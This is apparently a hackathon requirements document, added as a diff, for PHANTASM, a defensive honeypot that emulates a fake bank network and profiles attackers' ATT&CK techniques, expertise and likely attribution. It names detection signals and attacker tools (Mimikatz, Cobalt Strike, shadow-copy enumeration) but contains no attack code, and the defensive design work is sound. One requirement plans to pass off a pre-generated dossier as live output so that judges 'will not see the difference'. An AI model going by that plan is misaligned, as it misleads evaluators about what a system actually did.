@@ -1,0 +1,1386 @@
+================================================================================
+                         PRODUCT REQUIREMENTS DOCUMENT
+                                   PHANTASM
+              Proactive Honeypot with Adaptive Network Topology
+                        and Attacker Signature Mapping
+================================================================================
+  Document Version:   1.0 (DRAFT — INTERNAL)
+  Classification:     CONFIDENTIAL — TEAM USE ONLY
+  Author:             Team Lead, PHANTASM Core Team
+  Institution:        Vellore Institute of Technology, Vellore
+  Hackathon:          Smart India Hackathon 2026 — Internal Round
+  Track:              Blockchain & Cybersecurity
+  Date:               August 2026
+================================================================================
+
+FOREWORD FROM THE TEAM LEAD
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+I have spent the better part of my career watching organisations deploy
+honeypots, check the box, and call themselves protected. Then I watch the same
+organisations get breached six months later while their honeypot logged
+nothing useful because a competent attacker fingerprinted it in three minutes
+and walked around it.
+
+The cybersecurity industry has a deception problem. Not a lack of deception
+tools — we have dozens. A lack of deception intelligence. We build traps but
+we don't study what walks into them. We generate alerts but we don't generate
+understanding. We log commands but we don't understand the human behind them.
+
+PHANTASM is my answer to that problem. And this PRD is the document that will
+guide our team from idea to working system in 24 hours.
+
+Every requirement in this document exists for a reason. Every technical
+decision is grounded in how real attackers actually behave. Every design
+choice is made with one question in mind: when a judge sits in front of our
+demo, will they understand in 90 seconds that this system does something
+no other system in the world does?
+
+Read this document completely before writing a single line of code.
+Then read it again.
+
+— Team Lead, PHANTASM
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+SECTION 1: EXECUTIVE SUMMARY
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1.1 PRODUCT VISION
+──────────────────
+PHANTASM is a cognitive honeypot system — a next-generation active cyber
+defence platform that combines generative AI network simulation, real-time
+attacker behavioral profiling, and adaptive deception feedback into a single
+unified system that produces actionable threat intelligence automatically.
+
+The product vision in one sentence:
+  "Turn every cyberattack into a source of intelligence, not just an
+   incident to respond to."
+
+PHANTASM operates on a philosophy that inverts the traditional security
+posture. Instead of trying to keep attackers out of a decoy environment,
+we make them want to stay. Instead of logging their activity and hoping an
+analyst reads the log someday, we analyse their behaviour in real-time,
+build a psychological profile, reshape the environment to keep them engaged
+longer, and deliver a complete intelligence dossier the moment they leave.
+
+The attacker believes they are penetrating a real Indian BFSI enterprise
+network. They are not. They are inside a ghost — a generative construct that
+exists only to study them. And by the time they realise this (if they ever
+do), PHANTASM already knows who they are, what they wanted, what tools they
+use, who they probably work for, and what their next move will be.
+
+1.2 PRODUCT SCOPE FOR HACKATHON
+────────────────────────────────
+The hackathon deliverable is a functional prototype demonstrating the full
+PHANTASM loop: attack → detect → profile → adapt → dossier. Every component
+must be demonstrable live. No slideware. No pre-recorded videos.
+
+In-scope for hackathon build:
+  ✓ ShadowMesh: fake network generation, packet-level service emulation
+  ✓ MirrorTrap: real-time command profiling, ATT&CK classification
+  ✓ Adaptive feedback: rule-based topology mutation on profile triggers
+  ✓ Live dashboard: real-time network graph, profile card, command feed
+  ✓ Dossier engine: LLM-generated CERT-In formatted intelligence report
+
+Out of scope for hackathon (future roadmap):
+  ✗ RL-based topology optimisation (requires training time)
+  ✗ Multi-session operator correlation
+  ✗ MISP/CERT-In API direct integration
+  ✗ Production hardening and security of PHANTASM itself
+
+1.3 SUCCESS CRITERIA
+────────────────────
+The prototype is successful if all of the following are true:
+
+  [SC-01] A real Nmap scan against ShadowMesh returns plausible BFSI network
+          hosts with correct OS fingerprints, open ports, and service banners
+          without being identified as a honeypot by automated detection tools.
+
+  [SC-02] MirrorTrap classifies attacker commands into MITRE ATT&CK techniques
+          with >75% accuracy on the test command sequence within 500ms per
+          classification cycle.
+
+  [SC-03] The feedback loop triggers within 10 seconds of expertise threshold
+          being crossed, and new topology nodes materialise visibly on the
+          dashboard graph in real-time.
+
+  [SC-04] A complete dossier generates in under 60 seconds from session end,
+          containing all required fields and readable narrative.
+
+  [SC-05] The full demo loop runs without failure for 90 seconds with a judge
+          present, requiring no explanation of failures or workarounds.
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+SECTION 2: PROBLEM ANALYSIS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+2.1 THE THREAT LANDSCAPE
+─────────────────────────
+India's cyber threat environment in 2026 is categorically different from
+what it was five years ago. Three shifts define the current landscape:
+
+SHIFT 1 — Nation-State Actors Are Now Routine Threats to Enterprise
+APT-36 (Transparent Tribe, Pakistan-linked) has conducted documented
+spear-phishing and credential-harvesting campaigns against Indian defence,
+government, and BFSI targets continuously since at least 2016. Their
+tooling sophistication has increased year-on-year. They do not stumble into
+honeypots. They test environments deliberately and move on if deception is
+detected. Their average reconnaissance phase against a new target lasts 90
+days before initial access — they are patient, professional, and well-funded.
+
+APT-41 (China-linked, dual espionage and criminal operations) has targeted
+Indian pharmaceutical and technology companies, with particular interest in
+COVID-19 research and 5G deployment data. Their operators rotate between
+financially motivated attacks and state-directed espionage — the same group
+operates both missions. This makes attribution from TTPs alone genuinely
+complex; the same tools appear in both criminal and espionage contexts.
+
+Lazarus Group (North Korea-linked) is primarily financially motivated against
+Indian targets, with particular focus on cryptocurrency exchanges, fintech
+platforms, and SWIFT-connected banking infrastructure. They have successfully
+stolen hundreds of millions of dollars from financial institutions worldwide
+using a combination of watering hole attacks, supply chain compromise, and
+insider recruitment.
+
+SHIFT 2 — Living-off-the-Land Makes Signature Detection Useless
+Modern APT operators have largely abandoned custom malware for initial access
+and lateral movement. Instead they use tools already present on the target
+system: PowerShell, WMI, certutil, mshta, regsvr32. This is called
+"living-off-the-land" and it is catastrophically effective against
+signature-based detection because there is no malicious binary to detect.
+A defender watching for known-bad executables sees nothing. The attacker
+moves freely through the network using the system's own administrative tools.
+
+SHIFT 3 — Dwell Time Remains Dangerously High
+Despite billions spent on detection tools, the average attacker dwell time
+in Indian enterprise networks remains around 197 days before detection
+(IBM X-Force 2024). This means an attacker who compromised a network in
+January is typically not discovered until July. By then, they have mapped
+the entire network, exfiltrated target data, established persistence through
+multiple mechanisms, and potentially compromised backup systems to defeat
+recovery. The breach is catastrophic by the time anyone knows it happened.
+
+2.2 WHY EXISTING HONEYPOTS FAIL
+────────────────────────────────
+The honeypot concept is sound. The implementations are broken. Here is
+exactly why, from first principles:
+
+PROBLEM 1 — Static Topology is Fingerprinted in Minutes
+Every static honeypot has tells. A Honeyd installation responds to TCP SYN
+packets with timing that differs from real hardware by microseconds. An
+OpenCanary deployment has service banners from a fixed template library that
+advanced actors have memorised. T-Pot's Cowrie SSH honeypot has been
+reverse-engineered publicly and its responses documented on threat actor
+forums. When an APT operator's initial probe gets a response pattern they
+recognise, they do not attack. They route to real infrastructure. The honeypot
+has failed its primary purpose while the attacker has learned something useful.
+
+PROBLEM 2 — No Behavioural Intelligence Extraction
+Even when an attacker does enter a static honeypot, the output is a log file.
+A list of commands. Maybe a captured payload. There is no automated analysis
+of what this means: who is this operator? What is their skill level? What
+were they after? What other systems might they be targeting simultaneously?
+A human analyst must read the log, apply expertise, and write a report.
+This takes days. The intelligence is stale before it is actionable.
+
+PROBLEM 3 — No Feedback Loop
+The most fundamental failure of every existing honeypot is that it cannot
+adapt. A Ransomware operator and an APT espionage operator both enter the
+same static environment and see the same fake network. The ransomware operator
+ignores the fake "executive workstation" because it is not relevant to their
+objective. The espionage operator ignores the exposed fake database backup
+because it is not what they want. Each attacker type needs a different bait
+to stay engaged longest and reveal most. Static honeypots cannot provide this.
+PHANTASM can. This is the core innovation.
+
+PROBLEM 4 — Manual Reporting Breaks the Intelligence Cycle
+CERT-In's 2023 directive mandates 6-hour reporting of cybersecurity incidents.
+In practice, generating a compliant incident report requires a trained analyst
+spending 2-4 hours documenting the incident in the required format. Most
+organisations miss the 6-hour window. Many incidents go unreported entirely
+because the reporting burden is too high. The intelligence that should flow
+from these incidents to CERT-In's national threat picture is lost.
+
+2.3 THE OPPORTUNITY
+────────────────────
+Every one of the four problems above is solvable with technology that exists
+today but has not been assembled into a single operational system:
+
+  Generative AI can produce network environments that defeat fingerprinting.
+  Transformer models can classify attacker behaviour in real-time.
+  Rule-based (and later RL-based) controllers can adapt the environment.
+  LLMs can generate formatted compliance reports automatically.
+
+PHANTASM assembles these capabilities into the first cognitive honeypot.
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+SECTION 3: SYSTEM REQUIREMENTS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+3.1 FUNCTIONAL REQUIREMENTS — SHADOWMESH
+──────────────────────────────────────────
+
+FR-SM-01: Network Topology Generation
+  The system SHALL procedurally generate a fake enterprise network topology
+  on initialisation. The topology SHALL include:
+  - Minimum 15 fake hosts across 3 subnets (192.168.10.x, 192.168.20.x,
+    192.168.30.x) with RFC-1918 addressing
+  - Hostname conventions matching Indian BFSI enterprise naming patterns
+    (e.g., branch-server-01.bankname-internal.local,
+    dc-auth-prod.bankname-internal.local)
+  - Simulated network segmentation: user VLAN, server VLAN, management VLAN
+  - At minimum one each of: domain controller, database server, web server,
+    file server, payment gateway node, HR system node
+
+FR-SM-02: Packet-Level Service Emulation
+  The system SHALL intercept network packets at the kernel level using
+  NFQueue and respond with protocol-correct synthetic responses for the
+  following services at minimum:
+  - SSH (OpenSSH banner, key exchange initiation)
+  - HTTP/HTTPS (realistic web server headers, TLS handshake completion)
+  - SMB/CIFS (Windows file sharing protocol responses)
+  - RDP (Remote Desktop Protocol connection response)
+  - LDAP/LDAPS (directory service query responses)
+  - MySQL / MSSQL (database connection banner)
+  - FTP (file transfer protocol banner)
+  All responses SHALL match the OS and software version declared in the
+  fake topology for that host to maintain internal consistency.
+
+FR-SM-03: OS Fingerprint Consistency
+  The system SHALL produce Nmap -sV -O scan results that are internally
+  consistent for each fake host. A host declared as Windows Server 2019
+  SHALL produce TCP/IP stack characteristics, TTL values, window sizes,
+  and service response patterns consistent with Windows Server 2019.
+  The system SHALL NOT produce responses that are flagged as honeypot
+  by Nmap's honeypot detection NSE scripts.
+
+FR-SM-04: Active Directory Emulation
+  The system SHALL emulate a functional fake Active Directory domain
+  including:
+  - Kerberos authentication ticket exchange (TGT/TGS simulation)
+  - LDAP directory queries returning fake but structurally correct responses
+  - Procedurally generated user accounts (minimum 100) with realistic
+    Indian names, employee IDs, department assignments
+  - Group Policy Object enumeration responses
+  - Domain trust and forest structure responses
+  The AD emulation is critical because lateral movement via credential abuse
+  is the most common APT technique. An attacker who cannot interact with
+  what appears to be real AD will immediately suspect a honeypot.
+
+FR-SM-05: Background Traffic Generation
+  The system SHALL generate continuous synthetic background network traffic
+  to simulate a live enterprise environment. Required traffic types:
+  - NTP synchronisation packets from all fake hosts at realistic intervals
+  - DNS query/response traffic between fake hosts and fake DNS server
+  - SMB keep-alive packets between fake workstations
+  - LDAP authentication attempts at realistic frequency
+  - HTTPS traffic from fake workstations to fake internet proxy
+  Background traffic volume SHALL match statistical profiles from the
+  CICIDS-2023 dataset for a 100-employee enterprise network.
+  Rationale: A passive attacker performing traffic analysis on an enterprise
+  network they have partially compromised will notice the absence of
+  background traffic. This silence is a primary honeypot tell that
+  ShadowMesh must defeat.
+
+FR-SM-06: Dynamic Topology Mutation
+  The system SHALL accept topology mutation directives from the feedback
+  controller and materialise new network nodes within 5 seconds of
+  receiving the directive. Mutation SHALL be additive only (new nodes
+  appear — existing nodes do not disappear, as disappearing infrastructure
+  would alert the attacker). New nodes SHALL be fully emulated with all
+  services appropriate to their declared role.
+
+FR-SM-07: Response Latency Randomisation
+  The system SHALL randomise response latencies for all fake hosts within
+  a gaussian distribution centred on a host-specific baseline value.
+  Baseline values SHALL be assigned per host based on declared hardware
+  type (servers: 1-3ms, workstations: 2-8ms, network appliances: <1ms).
+  Jitter SHALL be applied as a ±30% variation around baseline.
+  Rationale: Consistent sub-millisecond response from all hosts on a
+  subnet is a primary timing-analysis honeypot fingerprint. Real hardware
+  has variable, hardware-dependent response characteristics.
+
+3.2 FUNCTIONAL REQUIREMENTS — MIRRORTRAP
+──────────────────────────────────────────
+
+FR-MT-01: Command Ingestion Pipeline
+  The system SHALL capture all commands issued by the attacker in any
+  interactive session (SSH, RDP command execution, PowerShell remoting,
+  web shell execution) and deliver them to the profiling engine with
+  millisecond-precision timestamps within 100ms of execution.
+
+FR-MT-02: MITRE ATT&CK Technique Classification
+  The system SHALL classify each attacker command or command sequence
+  into one or more MITRE ATT&CK v14 technique IDs using a fine-tuned
+  DistilBERT classification model. Requirements:
+  - Classification SHALL complete within 500ms per command
+  - The model SHALL handle multi-technique commands (one command may
+    trigger multiple ATT&CK technique tags simultaneously)
+  - Classification confidence scores SHALL be exposed for all predictions
+  - Minimum 75% accuracy on the test command sequence defined in
+    Appendix A of this document
+  - The model SHALL be pre-trained and loaded at startup, requiring
+    no runtime training
+
+FR-MT-03: Expertise Classification
+  The system SHALL maintain a continuously updated expertise classification
+  for the active session, expressed as one of four levels:
+  [Script Kiddie | Intermediate | Advanced | APT-Grade]
+
+  Classification SHALL be derived from the following observable signals:
+  - Command complexity score: weighted average of command length, pipe
+    count, subshell usage, redirection operators per command
+  - Error recovery pattern: time from error to successful retry, method
+    of retry (exact repeat vs. modified approach vs. alternative method)
+  - Tool sophistication: whether operator uses native OS tools, known
+    frameworks, or novel custom tooling
+  - Sequencing logic: whether commands follow a logical penetration testing
+    methodology or appear random/template-driven
+  - Privilege escalation speed: time from initial access to first
+    privilege escalation attempt (faster = more experienced)
+
+  The expertise classification SHALL update after every 5 commands and
+  SHALL only move upward during a session (an Advanced attacker who
+  makes an error does not get downgraded to Intermediate).
+
+FR-MT-04: Objective Inference
+  The system SHALL infer the attacker's primary objective from their
+  behaviour pattern, expressed as one of:
+  [Ransomware | Data Exfiltration | Espionage | Sabotage |
+   Cryptomining | Insider Threat | Financial Fraud | Unknown]
+
+  Inference SHALL use the following behavioural signals:
+  - Scanning behaviour: breadth-first (wide, shallow = ransomware,
+    cryptomining) vs. depth-first (narrow, deep = espionage, exfil)
+  - Data access pattern: bulk read operations vs. targeted specific
+    record lookups
+  - Persistence mechanism: which persistence techniques attempted
+    reveals operational intent (ransomware needs no persistence,
+    espionage requires durable implants)
+  - Lateral movement targeting: which systems the attacker prioritises
+    reveals what they value (HR = insider, SWIFT = financial fraud)
+  - Encryption preparation: shadow copy deletion, backup enumeration
+    = ransomware with high confidence
+
+FR-MT-05: Operational State Estimation
+  The system SHALL estimate the attacker operator's real-time cognitive
+  and emotional state using inter-command timing analysis:
+
+  Timing metrics computed in real-time:
+  - Mean inter-command interval (ICI) for rolling 20-command window
+  - ICI standard deviation (consistency indicator)
+  - ICI trend slope (accelerating = stress, decelerating = confusion)
+  - Long-pause events: ICI > 45 seconds flagged as "external consultation"
+  - Burst events: ICI < 1 second for 3+ consecutive commands = automation
+
+  State classifications:
+  - Calm/Methodical: ICI 5-30s, low variance, stable trend
+  - Stressed/Rushed: ICI decreasing trend, high acceleration coefficient
+  - Disoriented: high ICI variance, filler command clusters (whoami, pwd)
+  - Automated: ICI < 2s consistently, near-zero variance
+
+FR-MT-06: Attribution Signal Extraction
+  The system SHALL compute a TTP overlap score between the observed
+  session's technique vector and the published technique vectors for
+  all 138 MITRE ATT&CK named threat groups using cosine similarity.
+
+  Additionally, the system SHALL extract the following attribution signals:
+  - Tool signature matching: compare tool usage patterns against known
+    APT toolkit fingerprints (Cobalt Strike, Mimikatz, custom Python
+    implants, known RAT families)
+  - Command syntax idiom analysis: PowerShell quoting styles, bash
+    variable expansion patterns, encoding choices
+  - Session timing correlation: active hours mapped to timezone grid
+    to infer operator geographic region
+
+  Attribution output SHALL be a ranked probability distribution with
+  confidence scores. Groups with >60% overlap SHALL trigger an
+  immediate high-priority alert flag in the dashboard.
+
+FR-MT-07: Profile Update Frequency and Latency
+  The system SHALL publish profile updates to the Redis channel within
+  200ms of the 5-command trigger threshold being crossed. The dashboard
+  SHALL receive and render the update within 100ms of publication.
+  Total latency from command execution to profile card update on
+  dashboard SHALL not exceed 500ms end-to-end.
+
+3.3 FUNCTIONAL REQUIREMENTS — FEEDBACK CONTROLLER
+────────────────────────────────────────────────────
+
+FR-FC-01: Profile Subscription and Trigger Logic
+  The feedback controller SHALL subscribe to the MirrorTrap Redis
+  channel and evaluate every profile update against a set of trigger
+  conditions. Trigger conditions and corresponding actions:
+
+  TRIGGER 1 — APT/Advanced Operator Detected
+  Condition: Expertise = Advanced or APT-Grade AND Objective = Espionage
+             or Data Exfiltration AND confidence > 80%
+  Action: Issue directive to ShadowMesh to materialise crown jewel nodes:
+          FINACLE-PROD-DB (port 1521, Oracle emulation)
+          SWIFT-INTERFACE-GW (port 8443, HTTPS with MQ banner)
+          EXECUTIVE-WS-CFO (port 3389, RDP with 2FA prompt simulation)
+          UID-API-INTERNAL (port 443, REST endpoint returning fake Aadhaar
+          validation responses)
+
+  TRIGGER 2 — Ransomware Operator Detected
+  Condition: Objective = Ransomware AND any shadow copy enumeration
+             command detected
+  Action: Materialise backup infrastructure nodes:
+          BACKUP-SRV-01 (exposed SMB with fake *.bak files)
+          VEEAM-PROXY (port 9392, Veeam backup service banner)
+          NAS-STORAGE-01 (exposed NFS shares with fake DB dump files)
+
+  TRIGGER 3 — Insider Threat Pattern Detected
+  Condition: Objective = Insider Threat AND credential-only lateral movement
+             (no scanning, no exploitation attempts detected)
+  Action: Materialise sensitive HR and executive data nodes:
+          HR-DB-PROD (MSSQL with fake employee salary schema)
+          LEGAL-FILESHARE (SMB with fake legal document structure)
+          EXEC-SHAREPOINT (HTTPS with fake board minutes and compensation data)
+
+  TRIGGER 4 — Stress Event Detected
+  Condition: Operational state transitions to Stressed/Rushed from any state
+  Action: Slightly slow ShadowMesh response latencies by 20-40ms to
+          increase attacker uncertainty and prolong session dwell time.
+          Add a fake "partially restricted" access prompt to the next
+          service the attacker probes to create the illusion of hitting
+          a real security control.
+
+FR-FC-02: Engagement Score Tracking
+  The feedback controller SHALL maintain an engagement score for each
+  session, defined as:
+    Engagement Score = (actual dwell time) / (projected dwell time in
+    a static honeypot for this attacker profile)
+
+  Projected dwell time for a static honeypot is estimated at:
+    Script Kiddie: 8 minutes (automated tools, quick exit)
+    Intermediate: 15 minutes (some manual interaction, then exit)
+    Advanced: 4 minutes (quick fingerprint, avoid)
+    APT-Grade: 2 minutes (near-instant fingerprint, avoid)
+
+  An engagement score >1.0 means PHANTASM is outperforming a static
+  honeypot. This metric SHALL be displayed prominently on the dashboard.
+
+FR-FC-03: Mutation Rate Limiting
+  The system SHALL not issue more than one topology mutation directive
+  per 120 seconds to avoid making topology changes fast enough that an
+  attacker notices the environment is changing. Real enterprise networks
+  change slowly. An infrastructure node appearing within 10 seconds
+  of the attacker probing a new subnet would be suspicious. The 120-second
+  window gives enough time for the attacker to organically "discover"
+  new nodes through their own scanning.
+
+3.4 FUNCTIONAL REQUIREMENTS — DOSSIER ENGINE
+───────────────────────────────────────────────
+
+FR-DE-01: Session Aggregation
+  On session end, the dossier engine SHALL compile a complete structured
+  session record containing:
+  - Full chronological command log with millisecond timestamps
+  - Profile state snapshots at every 5-command checkpoint
+  - Complete ATT&CK technique list with first-observed timestamps
+  - Tool identifications with version where determinable
+  - All fake assets accessed and interaction depth per asset
+  - All C2 callback attempts with destination IP, port, and payload hash
+  - Engagement score and dwell time comparison
+  - Attribution probability distribution at session end
+
+FR-DE-02: Narrative Generation
+  The system SHALL pass the structured session record to the LLM API
+  with a carefully engineered system prompt that produces a narrative
+  analysis section in the dossier. The narrative SHALL:
+  - Describe the attack methodology in plain English readable by a
+    non-technical CERT-In analyst
+  - Identify the 3 most significant behavioural observations
+  - Note any anomalies from typical attacker patterns for the identified
+    profile type
+  - Comment on the stress event at minute 31 (or equivalent actual
+    observed event) with interpretation
+  - Provide attribution reasoning with explicit confidence caveats
+
+FR-DE-03: CERT-In MIS Format Compliance
+  The dossier SHALL be structured to contain all fields required by the
+  CERT-In Mandatory Information Security (MIS) incident report format:
+  - Incident type classification
+  - Affected systems (fake, clearly marked as deception environment)
+  - Attack vector
+  - Indicators of Compromise (IOCs): tool hashes, C2 IPs, domain names
+  - Timeline of events
+  - Recommended actions
+  - Organisation details (pre-filled template)
+
+FR-DE-04: Generation Time
+  The complete dossier, including LLM narrative generation and PDF
+  rendering, SHALL complete within 60 seconds of session end trigger.
+  This is a hard requirement for demo purposes.
+
+FR-DE-05: Physical Output
+  The system SHALL produce a PDF-rendered dossier that can be printed
+  and physically handed to a judge during the demo. The PDF SHALL be
+  formatted professionally with PHANTASM branding, classified markings,
+  and structured sections. This physical artefact is a critical demo
+  component — it makes the output tangible.
+
+3.5 FUNCTIONAL REQUIREMENTS — DASHBOARD
+─────────────────────────────────────────
+
+FR-DB-01: Real-Time Command Feed
+  The dashboard SHALL display a live scrolling feed of attacker commands
+  as they are executed. Each command entry SHALL show:
+  - Timestamp (HH:MM:SS.mmm)
+  - The command text (truncated to 120 characters if longer)
+  - ATT&CK technique tag(s) as a coloured badge
+  - Confidence score of the classification
+  Colour coding by severity category:
+    Discovery/Reconnaissance: blue (#3B82F6)
+    Credential Access: amber (#F59E0B)
+    Lateral Movement: orange (#EF4444 at 70% opacity)
+    Exfiltration/C2: red (#EF4444)
+    Execution: yellow (#EAB308)
+  New commands SHALL appear at the bottom with a subtle slide-in animation.
+
+FR-DB-02: Network Topology Graph
+  The dashboard SHALL render the ShadowMesh topology as an interactive
+  D3.js force-directed graph with the following behaviours:
+  - Nodes appear with a materialisation animation (scale from 0, glow pulse)
+  - Nodes pulse amber when actively being probed
+  - Nodes turn red when successfully accessed by attacker
+  - Edges animate directionally to show lateral movement paths
+  - New nodes added by the feedback loop appear with a distinctive
+    "emergence" animation (node grows from a pulse point)
+  - Clicking a node shows its fake service details in a side panel
+  - The graph SHALL re-layout smoothly (animated force simulation) when
+    new nodes are added without disorienting the existing view
+
+FR-DB-03: Operator Profile Card
+  The dashboard SHALL display a live profile card with four gauge
+  components updating in real-time:
+  - Expertise gauge: segmented arc from Script Kiddie to APT-Grade
+  - Objective confidence bars: horizontal bars for each objective type
+  - Operational state indicator: icon + colour coded status chip
+  - Attribution radar chart: spider/radar showing top 5 APT group overlaps
+  All four components SHALL animate smoothly on each profile update.
+  The profile card SHALL also show current session statistics:
+  commands issued, techniques observed, dwell time elapsed, engagement score.
+
+FR-DB-04: Stress Index Timeline
+  The dashboard SHALL render a live line chart showing the attacker's
+  inter-command timing (ICI) plotted over session time. The chart SHALL:
+  - Update in real-time as new commands arrive
+  - Show a moving average line overlaid on raw ICI data
+  - Mark significant events (stress onset, disorientation, long pauses)
+    with vertical annotation markers
+  - Use amber colouring for the stress threshold zone (ICI < 3 seconds
+    for consecutive commands)
+
+FR-DB-05: Session Control
+  The dashboard SHALL provide the following operator controls:
+  - Session start/stop button
+  - Manual topology mutation buttons (for demo purposes: one button per
+    scenario to manually trigger mutations mid-demo if needed)
+  - Dossier generation trigger button (also fires automatically on
+    session end but must be manually triggerable for demo timing control)
+  - Engagement score real-time display with baseline comparison
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+SECTION 4: NON-FUNCTIONAL REQUIREMENTS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+NFR-01: PERFORMANCE
+────────────────────
+  - Command ingestion to ATT&CK classification: <500ms (hard limit)
+  - Profile update publish to Redis: <200ms
+  - Dashboard WebSocket delivery from publish: <100ms
+  - Network graph re-render after data update: <16ms (60fps target)
+  - Topology mutation execution (new node live): <5 seconds
+  - Dossier generation end-to-end: <60 seconds (hard limit for demo)
+  - ShadowMesh packet response: within 2x the configured host baseline
+    latency (deterministic upper bound for fingerprinting resistance)
+
+NFR-02: RELIABILITY
+────────────────────
+  - The demo pipeline MUST survive a 10-minute uninterrupted session
+    without crash, hang, or unhandled exception
+  - All components SHALL have exception handling that logs errors to
+    a debug file rather than crashing the process
+  - Redis connection loss SHALL trigger automatic reconnection with
+    exponential backoff (1s, 2s, 4s) rather than system halt
+  - WebSocket disconnection SHALL trigger automatic client reconnection
+    with graceful state restoration
+  - The demo SHALL have a documented recovery procedure for each component
+    failure scenario that restores full demo capability in under 60 seconds
+
+NFR-03: SECURITY OF PHANTASM ITSELF
+──────────────────────────────────────
+  Note: PHANTASM is a security tool and must not itself be trivially
+  compromised. For hackathon purposes:
+  - All PHANTASM management interfaces (dashboard, session controls)
+    SHALL be bound to localhost only
+  - The ShadowMesh NFQueue hook SHALL only process packets on a designated
+    network interface, not the management interface
+  - No real credentials of any kind SHALL appear anywhere in PHANTASM's
+    codebase, configuration files, or generated outputs
+  - All fake credentials generated for the AD emulation SHALL be clearly
+    marked as synthetic in internal data structures
+
+NFR-04: PORTABILITY
+────────────────────
+  - The complete PHANTASM system SHALL run on a single laptop running
+    Ubuntu 22.04 LTS or higher
+  - All dependencies SHALL be installable via pip and npm with no
+    system package requirements beyond what ships with Ubuntu
+  - Exception: libnetfilter_queue requires apt install. This SHALL be
+    documented in the setup script and executed in pre-demo setup.
+  - Docker SHALL be used for ShadowMesh service containers to ensure
+    consistent behaviour regardless of host configuration
+  - The system SHALL not require internet connectivity during demo
+    execution. All model weights, datasets, and dependencies SHALL
+    be pre-loaded in the hackathon environment.
+
+NFR-05: DEMO STABILITY
+───────────────────────
+  This is the most important non-functional requirement for a hackathon.
+  A system that is 80% functional but crashes during the demo scores zero.
+  A system that is 60% functional but runs flawlessly for 90 seconds wins.
+
+  - Every component SHALL have a documented "demo mode" configuration that
+    reduces scope to the minimum needed for the demo loop to work
+  - The command sequence used in the demo SHALL be rehearsed minimum 5 times
+    on the exact hardware used for the demo before the presentation
+  - A backup command sequence SHALL be pre-scripted in a separate terminal
+    window, ready to run if live interaction fails
+  - All LLM API calls SHALL be wrapped with a cached fallback — if the API
+    call fails, the system returns a pre-generated dossier for the demo
+    profile. The judge will not see the difference.
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+SECTION 5: TECHNICAL ARCHITECTURE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+5.1 SYSTEM COMPONENTS AND INTERACTIONS
+────────────────────────────────────────
+
+COMPONENT 1 — ShadowMesh Core (sm_core.py)
+  Responsibilities:
+    - Topology generation and state management
+    - NFQueue packet interception and dispatch
+    - Per-service response handler registry
+    - Background traffic emission
+    - Mutation directive application
+  Interfaces:
+    - Exposes REST API on localhost:8001 for topology queries
+    - Subscribes to Redis channel "sm:mutations" for directives
+    - Publishes probe events to Redis channel "sm:events"
+
+COMPONENT 2 — Service Emulation Library (sm_services/)
+  One module per service family:
+    ssh_emulator.py — OpenSSH banner, key exchange
+    smb_emulator.py — SMB2 protocol responses
+    rdp_emulator.py — RDP connection sequence
+    ldap_emulator.py — LDAP/LDAPS directory responses
+    http_emulator.py — HTTP/HTTPS responses with fake application content
+    db_emulator.py — MySQL/MSSQL/Oracle connection banners
+    ad_emulator.py — Kerberos TGT/TGS, LDAP AD-specific responses
+  Each emulator reads the host configuration from the topology state and
+  returns a response appropriate to that host's declared specifications.
+
+COMPONENT 3 — GAN Traffic Generator (sm_traffic_gan.py)
+  Responsibilities:
+    - Load pre-trained DCGAN model weights at startup
+    - Generate synthetic inter-host traffic packets at configured volume
+    - Emit packets on the designated network interface via raw sockets
+  The GAN model is trained offline on CICIDS-2023 traffic and weights
+  are bundled with the repository (no training at runtime).
+
+COMPONENT 4 — MirrorTrap Engine (mt_engine.py)
+  Responsibilities:
+    - Receive commands from ShadowMesh via Redis "sm:events" channel
+    - Tokenise and batch commands for model inference
+    - Run BERT-base classifier for ATT&CK technique prediction
+    - Run DistilBERT expert-level classifier for expertise scoring
+    - Compute inter-command timing statistics
+    - Run cosine similarity attribution scoring against ATT&CK group vectors
+    - Publish profile updates to Redis "mt:profile" channel
+
+COMPONENT 5 — Feedback Controller (fc_controller.py)
+  Responsibilities:
+    - Subscribe to Redis "mt:profile" channel
+    - Evaluate trigger conditions on every profile update
+    - Issue topology mutation directives to Redis "sm:mutations"
+    - Maintain engagement score calculation
+    - Enforce mutation rate limiting (120-second minimum interval)
+
+COMPONENT 6 — Session Manager (session_mgr.py)
+  Responsibilities:
+    - Manage session lifecycle: start, active, ended
+    - Aggregate session data from all channels
+    - Trigger dossier generation on session end
+    - Provide session history API for dashboard
+
+COMPONENT 7 — Dossier Engine (de_engine.py)
+  Responsibilities:
+    - Receive session record from session manager
+    - Format structured data for LLM prompt
+    - Call LLM API with retry logic and cached fallback
+    - Parse LLM response and embed in dossier template
+    - Render PDF via WeasyPrint
+    - Expose generated PDF via localhost file server for download
+
+COMPONENT 8 — API Server (api_server.py)
+  Responsibilities:
+    - FastAPI application serving REST endpoints for dashboard
+    - WebSocket endpoint for real-time push to frontend
